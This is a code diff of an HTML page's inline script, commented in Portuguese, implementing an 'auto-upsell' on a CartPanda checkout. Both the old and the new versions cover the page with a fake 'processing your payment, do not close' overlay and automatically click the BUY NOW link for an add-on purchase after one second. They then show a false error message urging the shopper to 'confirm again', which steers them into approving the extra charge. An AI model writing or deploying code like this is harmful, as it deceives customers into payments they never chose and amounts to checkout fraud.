@@ -13,122 +13,156 @@
                 new OcuExternal();
                 </script>
             
-	<script>
-	document.addEventListener('DOMContentLoaded', function() {
-	  // 1) Injeta CSS do overlay full-screen
-	  const style = document.createElement('style');
-	  style.innerHTML = `
-		#customOverlay {
-		  position: fixed; top: 0; left: 0;
-		  width: 100%; height: 100%;
-		  background: rgba(255,255,255,0.95);
-		  z-index: 999999;
-		  display: flex; flex-direction: column;
-		  justify-content: center; align-items: center;
-		  font-family: Arial, sans-serif;
-		  text-align: center;
-		}
-		#customOverlay .spinner {
-		  border: 8px solid #f3f3f3;
-		  border-top: 8px solid #3498db;
-		  border-radius: 50%;
-		  width: 60px; height: 60px;
-		  animation: spin 1s linear infinite;
-		  margin-bottom: 20px;
-		}
-		@keyframes spin {
-		  from { transform: rotate(0deg); }
-		  to   { transform: rotate(360deg); }
-		}
-		#customOverlay .message {
-		  font-size: 1.2em;
-		  margin: 5px 0;
-		}
-		#customOverlay .buttons {
-		  margin-top: 20px;
-		  display: flex;
-		  gap: 10px;
-		}
-		#customOverlay .buttons button {
-		  padding: 10px 20px;
-		  font-size: 1em;
-		  cursor: pointer;
-		  border: none;
-		  border-radius: 4px;
-		}
-		#customOverlay #customDeclineBtn {
-		  background: #ccc;
-		  color: #000;
-		}
-		#customOverlay #customAcceptBtn {
-		  background: #28a745;
-		  color: #fff;
-		}
-	  `;
-	  document.head.appendChild(style);
+<script>
+(function() {
+  // Escopo único para não poluir o global
+  document.addEventListener('DOMContentLoaded', init);
 
-	  // 2) Cria overlay e adiciona ao <body>
-	  const overlay = document.createElement('div');
-	  overlay.id = 'customOverlay';
-	  overlay.innerHTML = `
-		<div class="spinner"></div>
-		<div class="message">NÃO FECHE NEM ATUALIZE A PÁGINA!</div>
-		<div class="message">PROCESSANDO SEU PAGAMENTO</div>
-	  `;
-	  document.body.appendChild(overlay);
+  function init() {
+    const overlay = createOverlay();
+    setupAutoClick();
+    observeModal(overlay);
+  }
 
-	  // 3) Após 1s, dispara clique no BUY NOW (accepted=yes)
-	  setTimeout(() => {
-		const buyLink = document.querySelector('a.cta-button[href*="accepted=yes"]');
-		if (buyLink) {
-		  buyLink.click();
-		} else {
-		  console.warn('Auto-upsell: botão BUY NOW não encontrado');
-		}
-	  }, 1000);
+  // 1) Cria o overlay full-screen com spinner e mensagens
+  function createOverlay() {
+    // Injeta CSS dinamicamente
+    const style = document.createElement('style');
+    style.innerHTML = `
+      /* Container do overlay */
+      #customOverlay {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100vw; height: 100vh;
+        background: rgba(255,255,255,0.95);
+        z-index: 999999;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        font-family: Arial, sans-serif;
+        text-align: center;
+      }
+      /* Spinner central */
+      #customOverlay .spinner {
+        border: 8px solid #f3f3f3;
+        border-top: 8px solid #3498db;
+        border-radius: 50%;
+        width: 60px; height: 60px;
+        animation: spin 1s linear infinite;
+        margin-bottom: 20px;
+      }
+      @keyframes spin {
+        from { transform: rotate(0deg); }
+        to   { transform: rotate(360deg); }
+      }
+      /* Mensagens iniciais */
+      #customOverlay .message {
+        font-size: 1.2em;
+        margin: 5px 0;
+      }
+    `;
+    document.head.appendChild(style);
 
-	  // 4) Observa a injeção do modal da CartPanda
-	  const observer = new MutationObserver((mutations, obs) => {
-		for (const m of mutations) {
-		  for (const node of m.addedNodes) {
-			if (node.nodeType === 1 &&
-			   (node.id === 'cartpanda-modal-container' ||
-				node.classList.contains('cartpanda-modal'))) {
-			  // 5) Modal apareceu → troca conteúdo do overlay
-			  overlay.innerHTML = `
-				<div class="message">
-				  HOUVE UM ERRO EM SEU PEDIDO,<br>
-				  CONFIRME NOVAMENTE CLICANDO NO BOTÃO ABAIXO
-				</div>
-				<div class="buttons">
-				  <button id="customDeclineBtn">NÃO, OBRIGADO</button>
-				  <button id="customAcceptBtn">SIM, CONFIRMAR</button>
-				</div>
-			  `;
-			  // 6) Liga nossos botões aos originais da CartPanda
-			  document
-				.getElementById('customDeclineBtn')
-				.addEventListener('click', () => {
-				  const declineBtn = document.getElementById('cartpanda-close-modal-btn');
-				  if (declineBtn) declineBtn.click();
-				  overlay.style.display = 'none';
-				});
-			  document
-				.getElementById('customAcceptBtn')
-				.addEventListener('click', () => {
-				  const confirmBtn = document.getElementById('cartpanda-payment-confirmation');
-				  if (confirmBtn) confirmBtn.click();
-				  overlay.style.display = 'none';
-				});
-			  obs.disconnect();
-			  return;
-			}
-		  }
-		}
-	  });
-	  observer.observe(document.body, { childList: true, subtree: true });
-	});
-	</script>
+    // Cria o elemento overlay
+    const overlay = document.createElement('div');
+    overlay.id = 'customOverlay';
+    overlay.innerHTML = `
+      <div class="spinner"></div>
+      <div class="message">NÃO FECHE NEM ATUALIZE A PÁGINA!</div>
+      <div class="message">PROCESSANDO SEU PAGAMENTO</div>
+    `;
+    // Começa interceptando eventos (spinner)
+    overlay.style.pointerEvents = 'auto';
+    document.body.appendChild(overlay);
+    return overlay;
+  }
+
+  // 2) Dispara clique automático no BUY NOW após 1s
+  function setupAutoClick() {
+    setTimeout(() => {
+      const buyLink = document.querySelector('a.cta-button[href*="accepted=yes"]');
+      if (buyLink) {
+        buyLink.click();
+      } else {
+        console.warn('Auto-upsell: botão BUY NOW não encontrado');
+      }
+    }, 1000);
+  }
+
+  // 3) Observa adição do modal da CartPanda
+  function observeModal(overlay) {
+    const observer = new MutationObserver((mutations, obs) => {
+      for (const m of mutations) {
+        for (const node of m.addedNodes) {
+          if (
+            node.nodeType === 1 &&
+            (node.id === 'cartpanda-modal-container' || node.classList.contains('cartpanda-modal'))
+          ) {
+            obs.disconnect();
+            enterErrorState(overlay);
+            return;
+          }
+        }
+      }
+    });
+    observer.observe(document.body, { childList: true, subtree: true });
+  }
+
+  // 4) Transição para estado de ERRO: substitui conteúdo e cria hotspots
+  function enterErrorState(overlay) {
+    // Deixa o overlay transparente a cliques
+    overlay.style.pointerEvents = 'none';
+    // Substitui somente pelo texto de erro
+    overlay.innerHTML = `
+      <div class="message">
+        HOUVE UM ERRO EM SEU PEDIDO,<br>
+        CONFIRME NOVAMENTE CLICANDO NO BOTÃO ABAIXO
+      </div>
+    `;
+    placeHotspots();
+  }
+
+  // 5) Cria divs transparentes sobre os botões nativos para indicar hotspots
+  function placeHotspots() {
+    const buttons = [
+      'cartpanda-close-modal-btn',
+      'cartpanda-payment-confirmation'
+    ];
+
+    buttons.forEach(id => {
+      const btn = document.getElementById(id);
+      if (!btn) {
+        console.warn(`Auto-upsell: botão ${id} não encontrado`);
+        return;
+      }
+      const hotspot = document.createElement('div');
+      hotspot.className = 'customHotspot';
+      hotspot.dataset.target = id;
+      // estilos base
+      Object.assign(hotspot.style, {
+        position: 'fixed',
+        background: 'transparent',
+        pointerEvents: 'none',
+        border: '2px dashed rgba(0,0,0,0.3)',
+        zIndex: 1000000
+      });
+      document.body.appendChild(hotspot);
+
+      // atualiza posição inicial e em resize
+      function update() {
+        const r = btn.getBoundingClientRect();
+        hotspot.style.top    = r.top    + 'px';
+        hotspot.style.left   = r.left   + 'px';
+        hotspot.style.width  = r.width  + 'px';
+        hotspot.style.height = r.height + 'px';
+      }
+      update();
+      window.addEventListener('resize', update);
+    });
+  }
+})();
+</script>
 
   <style>
     body {
